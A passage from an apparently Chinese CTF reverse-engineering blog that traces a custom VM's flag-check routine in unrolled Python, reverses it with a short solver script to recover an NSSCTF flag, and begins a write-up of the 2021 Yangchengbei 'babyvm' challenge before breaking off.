class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">now_num = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>然后化简逆向：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x16</span>, <span class="number">0x42</span>, <span class="number">0x39</span>, <span class="number">0x0F</span>, </span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, </span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x81</span>, </span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># last = [0]*100</span></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     b1 = input[now_num]</span></span><br><span class="line"><span class="comment">#     now_num += 1</span></span><br><span class="line"><span class="comment">#     b2 = input[now_num]</span></span><br><span class="line"><span class="comment">#     or_num = b1 | b2</span></span><br><span class="line"><span class="comment">#     not_1 = ~b1</span></span><br><span class="line"><span class="comment">#     not_2 = ~b2</span></span><br><span class="line"><span class="comment">#     or_not_num = not_2 | not_1</span></span><br><span class="line"><span class="comment">#     last[now_num - 1] = or_not_num &amp; or_num</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     save = last[now_num]</span></span><br><span class="line"><span class="comment">#     now_num+=1</span></span><br><span class="line"><span class="comment">#     last[now_num-1] = now_num + save - 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]-=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]^=last[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment">#NSSCTF&#123;H@ppy_Ch1ne5_NEwY3ar!1!1&#125;</span></span><br></pre></td></tr></table></figure><p>小结：这个题和之前遇到的jvm那道题一样，都要解析指令，还原流程</p><h2 id="羊城杯2021-babyvm"><a href="#羊城杯2021-babyvm" class="headerlink" title="羊城杯2021 babyvm"></a>羊城杯2021 babyvm</h2><p>这个题一样，只是在前面加了一个动态调试</p><p>指令码大概是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 